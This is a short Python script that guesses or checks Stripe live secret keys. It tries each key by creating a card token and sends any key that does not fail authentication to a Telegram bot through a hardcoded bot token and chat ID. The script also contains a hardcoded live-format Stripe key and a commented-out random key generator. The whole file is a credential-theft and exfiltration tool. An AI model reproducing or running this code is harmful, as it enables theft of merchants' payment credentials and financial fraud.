import stripe
import random, string
from requests import get
import concurrent.futures

def notif():
	URL = f"http://api.telegram.org/bot1224271943:AAHdX4Ew6C-55QSuka2qg6CCP5LsIPhC8_s/sendMessage?chat_id=979783476&text=HeheMantap"
	get(URL)
def hasil(key):
	URL = f"http://api.telegram.org/bot1224271943:AAHdX4Ew6C-55QSuka2qg6CCP5LsIPhC8_s/sendMessage?chat_id=979783476&text={key}"
	get(URL)

def che(key):
 stripe.api_key = key
 stripe.Token.create(
      card={
        "number": "4040404040404044",
        "exp_month": 10,
        "exp_year": 2025,
        "cvc": "343",
      },
    )
notif()
while True:
	key = "sk_live_69GKI0saLB8uIEnxzv8VTvRX"#"sk_live_{}".format(''.join(random.choices(string.ascii_letters+string.digits,k=int("{}".format(random.choice(["24","34"]))))))
	#print(key)
	try:
		che(key)
	except (stripe.error.AuthenticationError,stripe.error.InvalidRequestError):
		print("Dead: {}".format(key))
	except:
		print("Oke: {}".format(key))
		hasil(key)
     